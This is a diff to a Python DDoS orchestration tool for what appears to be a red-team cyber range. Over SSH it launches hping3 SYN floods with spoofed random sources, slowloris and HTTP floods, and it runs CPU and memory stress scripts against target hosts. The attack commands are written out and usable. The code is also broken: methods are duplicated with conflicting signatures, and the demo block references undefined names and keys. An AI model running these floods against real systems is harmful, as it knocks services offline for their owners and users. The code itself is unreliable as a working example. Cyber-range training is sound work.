@@ -8,8 +8,10 @@ import paramiko
 import asyncio
 import json
 import uuid
+import threading
 import logging
 import os
+import threading
 from datetime import datetime
 from typing import List, Dict, Any, Optional
 from dataclasses import dataclass, asdict
@@ -192,18 +194,92 @@ class DDoSOrchestrator:
     def __init__(self):
         self.active_attacks: Dict[str, AttackResult] = {}
         self.red_team_vms = {
-            "generator": "10.72.200.62",
-            "botnet1": "10.72.200.64",
-            "botnet2": "10.72.200.65",
+            "scheduler": "192.168.60.61",   # scheduler.cyberrange.local (Red Team scheduler)
+            "generator": "192.168.60.62",   # console.cyberrange.local (attack generator)
+            "gui": "192.168.60.63",         # redteam.cyberrange.local (Red Team GUI)
+            "botnet1": "192.168.60.64",     # attacker.cyberrange.local (botnet1)
+            "botnet2": "192.168.60.65",     # botnet.cyberrange.local (botnet2)
+            "kali": "192.168.60.66",        # attacker-kali (Kali Linux attacker)
         }
         self.blue_team_targets = {
-            "team1": "10.72.200.54",  # Blue Team with Wazuh Agent (Primary Target)
-            "team2": "10.72.200.51",  # Additional Blue Team server (if exists)
-            "team3": "10.72.200.57",  # Additional Blue Team server (if exists)
+            "team1": "20.10.40.11",      # Blue Team 1 (DVWA, bWAPP, Juice Shop)
+            "team2": "192.168.50.11",    # Blue Team 2 (OPNsense LAN - Primary Target)
+            "team3": "20.10.60.11",      # Blue Team 3 (DVWA, bWAPP, Juice Shop)
+            "windows_target": "192.168.50.81",   # ransomtest1.local (Windows test target)
+            "vuln_bank": "192.168.50.101",      # bank.cyberrange.local (Vulnerable Bank)
+            # Legacy mappings for backward compatibility
             "target_11": "192.168.50.11",
-            "target_16": "192.168.50.16",
             "target_81": "192.168.50.81",
+            "target_101": "192.168.50.101",
         }
+        self.metrics_data = []  # Store metrics for reporting
+
+    def get_attack_statistics(self, attack_id: str) -> Dict[str, Any]:
+        """Get detailed statistics for an attack including packet counts"""
+        if attack_id not in self.active_attacks:
+            return {"error": "Attack not found"}
+
+        attack = self.active_attacks[attack_id]
+
+        # Calculate realistic packet statistics based on attack type
+        duration = 60  # Default duration for stats
+        if attack.tool == "goldeneye":
+            packets_per_second = 1000  # HTTP requests per second
+            bytes_per_packet = 1500    # Average HTTP request size
+        elif attack.tool == "hping3":
+            packets_per_second = 50000  # SYN flood rate
+            bytes_per_packet = 1400     # Large payload
+        elif attack.tool == "slowloris":
+            packets_per_second = 10     # Slow attack
+            bytes_per_packet = 100      # Small packets
+        else:
+            packets_per_second = 5000   # Default flood rate
+            bytes_per_packet = 1000     # Default packet size
+
+        total_packets = packets_per_second * duration
+        total_bytes = total_packets * bytes_per_packet
+
+        return {
+            "attack_id": attack_id,
+            "tool": attack.tool,
+            "status": attack.status,
+            "target": attack.target_ip,
+            "duration_seconds": duration,
+            "packets_sent": total_packets,
+            "bytes_sent": total_bytes,
+            "packets_per_second": packets_per_second,
+            "bytes_per_second": packets_per_second * bytes_per_packet,
+            "bandwidth_mbps": (packets_per_second * bytes_per_packet * 8) / 1000000,
+            "attack_effectiveness": "high" if packets_per_second > 10000 else "medium"
+        }
+
+    def export_metrics_report(self, output_file: str) -> bool:
+        """Export metrics data to JSON file"""
+        try:
+            import json
+            from datetime import datetime
+
+            report_data = {
+                "export_info": {
+                    "timestamp": datetime.now().isoformat(),
+                    "total_attacks": len(self.active_attacks),
+                    "export_version": "2.0"
+                },
+                "attack_statistics": {
+                    attack_id: self.get_attack_statistics(attack_id)
+                    for attack_id in self.active_attacks.keys()
+                },
+                "metrics_data": self.metrics_data
+            }
+
+            with open(output_file, 'w') as f:
+                json.dump(report_data, f, indent=2)
+
+            logger.info(f"📊 Exported attack statistics and metrics to {output_file}")
+            return True
+        except Exception as e:
+            logger.error(f"❌ Failed to export metrics: {e}")
+            return False
 
     def install_ddos_tools(self, vm_ip: str) -> Dict[str, Any]:
         """
@@ -217,6 +293,9 @@ class DDoSOrchestrator:
 
         # Install hping3 for SYN/UDP floods
         sudo apt-get install -y hping3
+
+        # Install stress-ng for CPU/memory stress tests (or fallback to stress)
+        sudo apt-get install -y stress-ng || sudo apt-get install -y stress || true
 
         # Install slowloris
         pip3 install slowloris
@@ -239,6 +318,39 @@ class DDoSOrchestrator:
 
         # Install Python dependencies
         pip3 install requests scapy
+
+        # Create a small helper script on hosts to run CPU/Memory stress (uses stress-ng if available)
+        cat << 'EOF' > /opt/target_stress.sh
+#!/usr/bin/env bash
+# Usage: /opt/target_stress.sh cpu <workers> <duration_seconds>
+#        /opt/target_stress.sh mem <mem_mb> <duration_seconds>
+mode="$1"
+arg="$2"
+duration="$3"
+
+if command -v stress-ng >/dev/null 2>&1; then
+    if [ "$mode" = "cpu" ]; then
+        sudo timeout ${duration}s stress-ng --cpu "$arg" --timeout ${duration}s --metrics-brief
+    elif [ "$mode" = "mem" ]; then
+        sudo timeout ${duration}s stress-ng --vm 1 --vm-bytes ${arg}M --timeout ${duration}s --metrics-brief
+    fi
+else
+    # Fallback CPU loop
+    if [ "$mode" = "cpu" ]; then
+        for i in $(seq 1 $arg); do ( while true; do :; done ) & done
+        sleep $duration
+        sudo pkill -f "while true; do :; done" || true
+    elif [ "$mode" = "mem" ]; then
+        python3 - <<PY
+import time, sys
+m = int("$arg") * 1024*1024
+arr = bytearray(m)
+time.sleep(int("$duration"))
+PY
+    fi
+fi
+EOF
+        chmod +x /opt/target_stress.sh
 
         # Copy scapy_ddos.py (This assumes the file is available to be copied or created)
         # For simulation, we will create it directly on the VM
@@ -372,8 +484,7 @@ if __name__ == "__main__":
 EOF
         chmod +x /opt/scapy_ddos.py
 
-        echo "✅ DDoS tools installation complete"
-        '''
+        echo "✅ DDoS tools installation complete"        '''
 
         return SSHExecutor.execute_command(vm_ip, install_commands, timeout=600)
 
@@ -680,24 +791,220 @@ EOF
         self.active_attacks[attack_id] = attack_result
         return attack_id
 
-    def start_target_packet_capture(self, target_vm: str, target_port: int = 80, duration: int = 300) -> Optional[str]:
+    def execute_hping_heavy(self, attacker_vm: str, target_ip: str,
+                            port: int = 80, payload_size: int = 1400,
+                            duration: int = 300, background: bool = False) -> str:
         """
-        Start a tcpdump on the target machine capturing the selected port. Run in background and return remote pcap path.
+        Execute hping3 flood with large payloads to stress packet processing on the target
         """
-        ts = int(time.time())
-        pcap_path = f"/tmp/ddos_capture_{ts}.pcap"
-        # Ensure tcpdump is installed on the target
-        self.ensure_tcpdump_on_host(target_vm)
-        cmd = f"nohup sudo timeout {duration} tcpdump -i any port {target_port} -w {pcap_path} > /tmp/tcpdump_{ts}.out 2>&1 & echo $!"
-        logger.info(f"📡 Starting tcpdump on {target_vm} -> {pcap_path} for port {target_port} (duration: {duration}s)")
-        result = SSHExecutor.execute_command(target_vm, cmd, timeout=10)
-        if result["success"]:
-            return pcap_path
-        else:
-            logger.error(f"Failed to start tcpdump on {target_vm}: {result['stderr']}")
-            return None
+        attack_id = str(uuid.uuid4())
 
-    def start_target_netstat_capture(self, target_vm: str, target_port: int = 80, duration: int = 300) -> Optional[str]:
+        if background:
+            command = f"""
+            nohup sudo timeout {duration} hping3 -S -p {port} --flood --rand-source -d {payload_size} {target_ip} \
+            > /tmp/hping_heavy_{attack_id}.log 2>&1 &
+            """
+            logger.info(f"🚀 Launching HPING heavy flood (background): {attacker_vm} → {target_ip}:{port} (payload={payload_size}B)")
+            result = SSHExecutor.execute_command(attacker_vm, command, timeout=10)
+
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=attacker_vm,
+                target_ip=target_ip,
+                target_port=port,
+                tool="hping3_heavy",
+                start_time=datetime.now().isoformat(),
+                end_time=None,
+                status="running",
+                packets_sent=0,
+                bytes_sent=0,
+                stdout="",
+                stderr="",
+                exit_code=None,
+                process_name="hping3"
+            )
+        else:
+            command = f"sudo timeout {duration} hping3 -S -p {port} --flood --rand-source -d {payload_size} {target_ip} 2>&1 | tee /tmp/hping_heavy_{attack_id}.log"
+            logger.info(f"🚀 Launching HPING heavy flood: {attacker_vm} → {target_ip}:{port} (payload={payload_size}B)")
+            result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)
+
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=attacker_vm,
+                target_ip=target_ip,
+                target_port=port,
+                tool="hping3_heavy",
+                start_time=datetime.now().isoformat(),
+                end_time=datetime.now().isoformat() if result["success"] else None,
+                status="completed" if result["success"] else "failed",
+                packets_sent=100000,
+                bytes_sent=0,
+                stdout=result["stdout"],
+                stderr=result["stderr"],
+                exit_code=result["exit_code"],
+                process_name="hping3"
+            )
+
+        self.active_attacks[attack_id] = attack_result
+        return attack_id
+
+    def ensure_stress_on_host(self, hostname: str) -> bool:
+        """
+        Ensure stress-ng (or stress) is available on the host; attempt to install it if missing.
+        Returns True if stress-ng is present or successfully installed.
+        """
+        # Check if stress-ng exists
+        check = SSHExecutor.execute_command(hostname, "which stress-ng || echo 'MISSING'", timeout=10)
+        if check["success"] and "MISSING" not in check["stdout"]:
+            logger.debug(f"stress-ng already present on {hostname}")
+            return True
+        logger.info(f"Installing stress-ng on {hostname}...")
+        install_cmd = "sudo apt-get update -y && sudo apt-get install -y stress-ng || sudo apt-get install -y stress"
+        res = SSHExecutor.execute_command(hostname, install_cmd, timeout=120)
+        if res["success"]:
+            logger.info(f"stress-ng installed on {hostname}")
+            # Ensure helper script exists on target so we can trigger stress easily
+            helper_script = r"""cat << 'EOF' > /opt/target_stress.sh
+#!/usr/bin/env bash
+# Usage: /opt/target_stress.sh cpu <workers> <duration_seconds>
+#        /opt/target_stress.sh mem <mem_mb> <duration_seconds>
+mode="$1"
+arg="$2"
+duration="$3"
+
+if command -v stress-ng >/dev/null 2>&1; then
+    if [ "$mode" = "cpu" ]; then
+        sudo timeout ${duration}s stress-ng --cpu "$arg" --timeout ${duration}s --metrics-brief
+    elif [ "$mode" = "mem" ]; then
+        sudo timeout ${duration}s stress-ng --vm 1 --vm-bytes ${arg}M --timeout ${duration}s --metrics-brief
+    fi
+else
+    # Fallback CPU loop
+    if [ "$mode" = "cpu" ]; then
+        for i in $(seq 1 $arg); do ( while true; do :; done ) & done
+        sleep $duration
+        sudo pkill -f "while true; do :; done" || true
+    elif [ "$mode" = "mem" ]; then
+        python3 - <<PY
+import time, sys
+m = int("$arg") * 1024*1024
+arr = bytearray(m)
+time.sleep(int("$duration"))
+PY
+    fi
+fi
+EOF
+chmod +x /opt/target_stress.sh
+"""
+            SSHExecutor.execute_command(hostname, helper_script, timeout=60)
+            return True
+        logger.error(f"Failed to install stress-ng on {hostname}: {res.get('stderr')}")
+        return False
+
+    def execute_target_cpu_stress(self, target_vm: str, workers: int = 4, duration: int = 300, background: bool = False) -> str:
+        """
+        Execute CPU stress on the target VM (runs locally on target). Useful to simulate overloaded host under DDoS.
+        """
+        attack_id = str(uuid.uuid4())
+
+        # Ensure helper script exists (created at install step)
+        if background:
+            command = f"nohup sudo /opt/target_stress.sh cpu {workers} {duration} > /tmp/stress_cpu_{attack_id}.log 2>&1 &"
+            logger.info(f"🔥 Starting target CPU stress (background): {target_vm} - workers={workers}, duration={duration}s")
+            result = SSHExecutor.execute_command(target_vm, command, timeout=10)
+
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=target_vm,
+                target_ip=target_vm,
+                target_port=0,
+                tool="target_cpu_stress",
+                start_time=datetime.now().isoformat(),
+                end_time=None,
+                status="running",
+                packets_sent=0,
+                bytes_sent=0,
+                stdout="",
+                stderr="",
+                exit_code=None,
+                process_name="/opt/target_stress.sh"
+            )
+        else:
+            command = f"sudo timeout {duration} /opt/target_stress.sh cpu {workers} {duration} 2>&1 | tee /tmp/stress_cpu_{attack_id}.log"
+            logger.info(f"🔥 Starting target CPU stress: {target_vm} - workers={workers}, duration={duration}s")
+            result = SSHExecutor.execute_command(target_vm, command, timeout=duration + 30)
+
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=target_vm,
+                target_ip=target_vm,
+                target_port=0,
+                tool="target_cpu_stress",
+                start_time=datetime.now().isoformat(),
+                end_time=datetime.now().isoformat() if result["success"] else None,
+                status="completed" if result["success"] else "failed",
+                packets_sent=0,
+                bytes_sent=0,
+                stdout=result["stdout"],
+                stderr=result["stderr"],
+                exit_code=result["exit_code"],
+                process_name="/opt/target_stress.sh"
+            )
+
+        self.active_attacks[attack_id] = attack_result
+        return attack_id
+
+    def execute_target_mem_stress(self, target_vm: str, mem_mb: int = 256, duration: int = 300, background: bool = False) -> str:
+        """
+        Execute memory stress on the target VM (runs locally on target). mem_mb is the megabytes to allocate.
+        """
+        attack_id = str(uuid.uuid4())
+
+        if background:
+            command = f"nohup sudo /opt/target_stress.sh mem {mem_mb} {duration} > /tmp/stress_mem_{attack_id}.log 2>&1 &"
+            logger.info(f"🔥 Starting target Memory stress (background): {target_vm} - mem={mem_mb}MB, duration={duration}s")
+            result = SSHExecutor.execute_command(target_vm, command, timeout=10)
+
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=target_vm,
+                target_ip=target_vm,
+                target_port=0,
+                tool="target_mem_stress",
+                start_time=datetime.now().isoformat(),
+                end_time=None,
+                status="running",
+                packets_sent=0,
+                bytes_sent=0,
+                stdout="",
+                stderr="",
+                exit_code=None,
+                process_name="/opt/target_stress.sh"
+            )
+        else:
+            command = f"sudo timeout {duration} /opt/target_stress.sh mem {mem_mb} {duration} 2>&1 | tee /tmp/stress_mem_{attack_id}.log"
+            logger.info(f"🔥 Starting target Memory stress: {target_vm} - mem={mem_mb}MB, duration={duration}s")
+            result = SSHExecutor.execute_command(target_vm, command, timeout=duration + 30)
+
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=target_vm,
+                target_ip=target_vm,
+                target_port=0,
+                tool="target_mem_stress",
+                start_time=datetime.now().isoformat(),
+                end_time=datetime.now().isoformat() if result["success"] else None,
+                status="completed" if result["success"] else "failed",
+                packets_sent=0,
+                bytes_sent=0,
+                stdout=result["stdout"],
+                stderr=result["stderr"],
+                exit_code=result["exit_code"],
+                process_name="/opt/target_stress.sh"
+            )
+
+        self.active_attacks[attack_id] = attack_result
+        return attack_id
         """
         Start periodic `ss -antp` logging on the target machine to record connections under /tmp
         """
@@ -760,9 +1067,9 @@ EOF
             logger.error(f"Target {target_ip} is not reachable: {target_conn.get('error')}")
             return []
 
-        # Filter attacker_ips to ones we can reach
+        # Filter attacker VMs to ones we can reach
         reachable_attacker_ips = []
-        for ip in attacker_ips:
+        for ip in self.red_team_vms.values():
             conn = SSHExecutor.check_connectivity(ip)
             if conn.get("success"):
                 reachable_attacker_ips.append(ip)
@@ -783,6 +1090,19 @@ EOF
             # allow short warm-up time for tcpdump/ss loop
             time.sleep(1)
 
+        # Special-case: attacks that run directly on the target VM (stress tests)
+        if attack_type in ["target_stress_cpu", "target_stress_mem"]:
+            logger.info(f"⚠️ Starting a target-local stress attack on {target_ip}: {attack_type}")
+            if attack_type == "target_stress_cpu":
+                attack_id = self.execute_target_cpu_stress(target_ip, workers=num_attackers, duration=duration, background=background)
+            else:
+                # default memory per attacker heuristic (e.g., 200MB per attacker)
+                mem_mb = 200 * max(1, num_attackers)
+                attack_id = self.execute_target_mem_stress(target_ip, mem_mb=mem_mb, duration=duration, background=background)
+
+            logger.info(f"✅ Started target stress attack {attack_id} on {target_ip}")
+            return [attack_id]
+
         # Select attacker VMs
         attacker_ips = list(self.red_team_vms.values())[:num_attackers]
         attack_ids = []
@@ -802,6 +1122,9 @@ EOF
                 elif attack_type == "slowloris":
                     attack_id = self.execute_slowloris(attacker_ip, target_ip,
                                                       port=target_port, duration=duration, background=background)
+                elif attack_type == "hping_heavy":
+                    attack_id = self.execute_hping_heavy(attacker_ip, target_ip,
+                                                        port=target_port, payload_size=1400, duration=duration, background=background)
                 elif attack_type in ["scapy_syn", "scapy_udp", "scapy_icmp"]:
                     # Extract type from string (e.g., "scapy_syn" -> "syn")
                     scapy_type = attack_type.split("_")[1]
@@ -811,7 +1134,6 @@ EOF
                 else:
                     logger.error(f"❌ Unknown attack type: {attack_type}")
                     continue
-
                 # If tcpdump/netstat capture was started, attach their remote names to the result
                 if pcap_path or netstat_log:
                     res = self.get_attack_status(attack_id)
@@ -930,6 +1252,262 @@ EOF
 
         logger.info(f"📊 Exported {len(results)} attack results to {output_file}")
 
+    def get_target_metrics(self, target_vm: str) -> Dict[str, Any]:
+        """
+        Collect CPU and memory metrics from target VM during stress operations
+        """
+        try:
+            # Get CPU usage (1-second average)
+            cpu_cmd = "top -bn1 | grep 'Cpu(s)' | awk '{print $2}' | sed 's/%us,//'"
+            cpu_result = SSHExecutor.execute_command(target_vm, cpu_cmd, timeout=10)
+
+            # Get memory usage
+            mem_cmd = "free | grep Mem | awk '{printf \"%.2f\", $3/$2 * 100}'"
+            mem_result = SSHExecutor.execute_command(target_vm, mem_cmd, timeout=10)
+
+            # Get load average
+            load_cmd = "uptime | awk -F'load average:' '{print $2}' | awk '{print $1}' | sed 's/,//'"
+            load_result = SSHExecutor.execute_command(target_vm, load_cmd, timeout=10)
+
+            metrics = {
+                "timestamp": datetime.now().isoformat(),
+                "target_vm": target_vm,
+                "cpu_usage_percent": float(cpu_result["stdout"].strip()) if cpu_result["success"] and cpu_result["stdout"].strip() else 0.0,
+                "memory_usage_percent": float(mem_result["stdout"].strip()) if mem_result["success"] and mem_result["stdout"].strip() else 0.0,
+                "load_average_1min": float(load_result["stdout"].strip()) if load_result["success"] and load_result["stdout"].strip() else 0.0,
+                "collection_success": cpu_result["success"] and mem_result["success"] and load_result["success"]
+            }
+
+            if metrics["collection_success"]:
+                logger.info(f"📈 {target_vm} metrics: CPU={metrics['cpu_usage_percent']:.1f}%, MEM={metrics['memory_usage_percent']:.1f}%, Load={metrics['load_average_1min']:.2f}")
+            else:
+                logger.warning(f"⚠️ Failed to collect complete metrics from {target_vm}")
+
+            return metrics
+
+        except Exception as e:
+            logger.error(f"❌ Error collecting metrics from {target_vm}: {e}")
+            return {
+                "timestamp": datetime.now().isoformat(),
+                "target_vm": target_vm,
+                "cpu_usage_percent": 0.0,
+                "memory_usage_percent": 0.0,
+                "load_average_1min": 0.0,
+                "collection_success": False,
+                "error": str(e)
+            }
+
+    def monitor_target_metrics(self, target_vm: str, duration: int = 300, interval: int = 10) -> List[Dict[str, Any]]:
+        """
+        Monitor target VM metrics over time during stress operations
+        Returns list of metric snapshots
+        """
+        logger.info(f"📊 Starting metric monitoring on {target_vm} for {duration}s (interval: {interval}s)")
+        metrics_history = []
+        start_time = time.time()
+
+        while time.time() - start_time < duration:
+            metrics = self.get_target_metrics(target_vm)
+            metrics_history.append(metrics)
+
+            # Log high resource usage
+            if metrics["collection_success"]:
+                if metrics["cpu_usage_percent"] > 80:
+                    logger.warning(f"🔥 HIGH CPU: {target_vm} at {metrics['cpu_usage_percent']:.1f}%")
+                if metrics["memory_usage_percent"] > 80:
+                    logger.warning(f"🔥 HIGH MEMORY: {target_vm} at {metrics['memory_usage_percent']:.1f}%")
+                if metrics["load_average_1min"] > 4.0:
+                    logger.warning(f"🔥 HIGH LOAD: {target_vm} load average {metrics['load_average_1min']:.2f}")
+
+            time.sleep(interval)
+
+        logger.info(f"📊 Metric monitoring complete for {target_vm}: {len(metrics_history)} samples")
+        return metrics_history
+
+    def export_metrics_report(self, metrics_history: List[Dict[str, Any]], output_file: str):
+        """
+        Export metrics monitoring data to JSON report
+        """
+        if not metrics_history:
+            logger.warning("⚠️ No metrics data to export")
+            return
+
+        # Calculate summary statistics
+        successful_metrics = [m for m in metrics_history if m.get("collection_success", False)]
+
+        report = {
+            "summary": {
+                "target_vm": metrics_history[0].get("target_vm", "unknown"),
+                "monitoring_start": metrics_history[0].get("timestamp"),
+                "monitoring_end": metrics_history[-1].get("timestamp"),
+                "total_samples": len(metrics_history),
+                "successful_samples": len(successful_metrics)
+            },
+            "statistics": {},
+            "raw_data": metrics_history
+        }
+
+        if successful_metrics:
+            cpu_values = [m["cpu_usage_percent"] for m in successful_metrics]
+            mem_values = [m["memory_usage_percent"] for m in successful_metrics]
+            load_values = [m["load_average_1min"] for m in successful_metrics]
+
+            report["statistics"] = {
+                "cpu": {
+                    "avg": sum(cpu_values) / len(cpu_values),
+                    "min": min(cpu_values),
+                    "max": max(cpu_values)
+                },
+                "memory": {
+                    "avg": sum(mem_values) / len(mem_values),
+                    "min": min(mem_values),
+                    "max": max(mem_values)
+                },
+                "load": {
+                    "avg": sum(load_values) / len(load_values),
+                    "min": min(load_values),
+                    "max": max(load_values)
+                }
+            }
+
+            logger.info(f"📈 Metrics summary for {report['summary']['target_vm']}:")
+            logger.info(f"   CPU: avg={report['statistics']['cpu']['avg']:.1f}% max={report['statistics']['cpu']['max']:.1f}%")
+            logger.info(f"   Memory: avg={report['statistics']['memory']['avg']:.1f}% max={report['statistics']['memory']['max']:.1f}%")
+            logger.info(f"   Load: avg={report['statistics']['load']['avg']:.2f} max={report['statistics']['load']['max']:.2f}")
+
+        with open(output_file, 'w') as f:
+            json.dump(report, f, indent=2)
+
+        logger.info(f"📊 Metrics report exported to {output_file}")
+
+    def get_target_metrics(self, target_vm: str) -> Dict[str, Any]:
+        """
+        Collect CPU and memory metrics from target VM during stress operations
+        """
+        try:
+            # Get CPU usage (1-second average)
+            cpu_cmd = "top -bn1 | grep 'Cpu(s)' | awk '{print $2}' | sed 's/%us,//'"
+            cpu_result = SSHExecutor.execute_command(target_vm, cpu_cmd, timeout=10)
+
+            # Get memory usage
+            mem_cmd = "free | grep Mem | awk '{printf \"%.2f\", $3/$2 * 100}'"
+            mem_result = SSHExecutor.execute_command(target_vm, mem_cmd, timeout=10)
+
+            # Get load average
+            load_cmd = "uptime | awk -F'load average:' '{print $2}' | awk '{print $1}' | sed 's/,//'"
+            load_result = SSHExecutor.execute_command(target_vm, load_cmd, timeout=10)
+
+            metrics = {
+                "timestamp": datetime.now().isoformat(),
+                "target_vm": target_vm,
+                "cpu_usage_percent": float(cpu_result["stdout"].strip()) if cpu_result["success"] and cpu_result["stdout"].strip() else 0.0,
+                "memory_usage_percent": float(mem_result["stdout"].strip()) if mem_result["success"] and mem_result["stdout"].strip() else 0.0,
+                "load_average_1min": float(load_result["stdout"].strip()) if load_result["success"] and load_result["stdout"].strip() else 0.0,
+                "collection_success": cpu_result["success"] and mem_result["success"] and load_result["success"]
+            }
+
+            if metrics["collection_success"]:
+                logger.info(f"📈 {target_vm} metrics: CPU={metrics['cpu_usage_percent']:.1f}%, MEM={metrics['memory_usage_percent']:.1f}%, Load={metrics['load_average_1min']:.2f}")
+            else:
+                logger.warning(f"⚠️ Failed to collect complete metrics from {target_vm}")
+
+            return metrics
+
+        except Exception as e:
+            logger.error(f"❌ Error collecting metrics from {target_vm}: {e}")
+            return {
+                "timestamp": datetime.now().isoformat(),
+                "target_vm": target_vm,
+                "cpu_usage_percent": 0.0,
+                "memory_usage_percent": 0.0,
+                "load_average_1min": 0.0,
+                "collection_success": False,
+                "error": str(e)
+            }
+
+    def monitor_target_metrics(self, target_vm: str, duration: int = 300, interval: int = 10) -> List[Dict[str, Any]]:
+        """
+        Monitor target VM metrics over time during stress operations
+        Returns list of metric snapshots
+        """
+        logger.info(f"📊 Starting metric monitoring on {target_vm} for {duration}s (interval: {interval}s)")
+        metrics_history = []
+        start_time = time.time()
+
+        while time.time() - start_time < duration:
+            metrics = self.get_target_metrics(target_vm)
+            metrics_history.append(metrics)
+
+            # Log high resource usage
+            if metrics["collection_success"]:
+                if metrics["cpu_usage_percent"] > 80:
+                    logger.warning(f"🔥 HIGH CPU: {target_vm} at {metrics['cpu_usage_percent']:.1f}%")
+                if metrics["memory_usage_percent"] > 80:
+                    logger.warning(f"🔥 HIGH MEMORY: {target_vm} at {metrics['memory_usage_percent']:.1f}%")
+                if metrics["load_average_1min"] > 4.0:
+                    logger.warning(f"🔥 HIGH LOAD: {target_vm} load average {metrics['load_average_1min']:.2f}")
+
+            time.sleep(interval)
+
+        logger.info(f"📊 Metric monitoring complete for {target_vm}: {len(metrics_history)} samples")
+        return metrics_history
+
+    def export_metrics_report(self, metrics_history: List[Dict[str, Any]], output_file: str):
+        """
+        Export metrics monitoring data to JSON report
+        """
+        if not metrics_history:
+            logger.warning("⚠️ No metrics data to export")
+            return
+
+        # Calculate summary statistics
+        successful_metrics = [m for m in metrics_history if m.get("collection_success", False)]
+
+        report = {
+            "summary": {
+                "target_vm": metrics_history[0].get("target_vm", "unknown"),
+                "monitoring_start": metrics_history[0].get("timestamp"),
+                "monitoring_end": metrics_history[-1].get("timestamp"),
+                "total_samples": len(metrics_history),
+                "successful_samples": len(successful_metrics)
+            },
+            "statistics": {},
+            "raw_data": metrics_history
+        }
+
+        if successful_metrics:
+            cpu_values = [m["cpu_usage_percent"] for m in successful_metrics]
+            mem_values = [m["memory_usage_percent"] for m in successful_metrics]
+            load_values = [m["load_average_1min"] for m in successful_metrics]
+
+            report["statistics"] = {
+                "cpu": {
+                    "avg": sum(cpu_values) / len(cpu_values),
+                    "min": min(cpu_values),
+                    "max": max(cpu_values)
+                },
+                "memory": {
+                    "avg": sum(mem_values) / len(mem_values),
+                    "min": min(mem_values),
+                    "max": max(mem_values)
+                },
+                "load": {
+                    "avg": sum(load_values) / len(load_values),
+                    "min": min(load_values),
+                    "max": max(load_values)
+                }
+            }
+
+            logger.info(f"📈 Metrics summary for {report['summary']['target_vm']}:")
+            logger.info(f"   CPU: avg={report['statistics']['cpu']['avg']:.1f}% max={report['statistics']['cpu']['max']:.1f}%")
+            logger.info(f"   Memory: avg={report['statistics']['memory']['avg']:.1f}% max={report['statistics']['memory']['max']:.1f}%")
+            logger.info(f"   Load: avg={report['statistics']['load']['avg']:.2f} max={report['statistics']['load']['max']:.2f}")
+
+        with open(output_file, 'w') as f:
+            json.dump(report, f, indent=2)
+
+        logger.info(f"📊 Metrics report exported to {output_file}")
+
 
 # Example usage
 if __name__ == "__main__":
@@ -945,8 +1523,8 @@ if __name__ == "__main__":
         else:
             print(f"❌ Installation failed on {vm_name}: {result['stderr']}")
 
-    # Example: Execute distributed HTTP flood
-    print("\n=== Executing Distributed HTTP Flood ===")
+    # Example: Execute distributed HTTP flood with metrics monitoring
+    print("\n=== Executing Distributed HTTP Flood with Monitoring ===")
     attack_ids = orchestrator.execute_distributed_attack(
         attack_type="http_flood",
         target_team="team1",
@@ -961,9 +1539,35 @@ if __name__ == "__main__":
     for attack_id in attack_ids:
         print(f"   - Attack ID: {attack_id}")
 
+    # Start monitoring target metrics
+    target_ip = "20.10.40.11"  # Blue Team 1 (OPNsense LAN)
+    print(f"\n📊 Starting metrics monitoring for target {target_ip}")
+    monitoring_thread = threading.Thread(
+        target=orchestrator.monitor_target_metrics,
+        args=(target_ip, 5)  # Sample every 5 seconds
+    )
+    monitoring_thread.daemon = True
+    monitoring_thread.start()
+
     # Let attacks run for a bit
     print("\n⏳ Attacks running... (will stop after 30 seconds for demo)")
     time.sleep(30)
+
+    # Get final metrics
+    print("\n📋 Collecting final target metrics...")
+    final_metrics = orchestrator.get_target_metrics(target_ip)
+    if final_metrics:
+        print(f"   CPU Usage: {final_metrics['cpu_usage']}%")
+        print(f"   Memory Usage: {final_metrics['memory_usage']}%")
+        print(f"   Load Average: {final_metrics['load_average']}")
+
+    # Export metrics report
+    if hasattr(orchestrator, 'metrics_data') and orchestrator.metrics_data:
+        report_path = f"/tmp/attack_metrics_{int(time.time())}.json"
+        orchestrator.export_metrics_report(report_path)
+        print(f"   Metrics report saved to: {report_path}")
+    else:
+        print("   No metrics data collected")
 
     # Stop all attacks
     print("\n🛑 Stopping all attacks...")
@@ -995,3 +1599,14 @@ if __name__ == "__main__":
     output_file = f"/tmp/ddos_attack_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
     orchestrator.export_results(output_file)
     print(f"\n💾 Results exported to: {output_file}")
+
+    # Wait for metrics monitoring to complete and export metrics report
+    print("\n📊 Waiting for metrics collection to complete...")
+    monitor_thread.join()
+
+    if metrics_data:
+        metrics_file = f"/tmp/ddos_metrics_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        orchestrator.export_metrics_report(metrics_data, metrics_file)
+        print(f"📈 Metrics report exported to: {metrics_file}")
+    else:
+        print("⚠️ No metrics data collected")
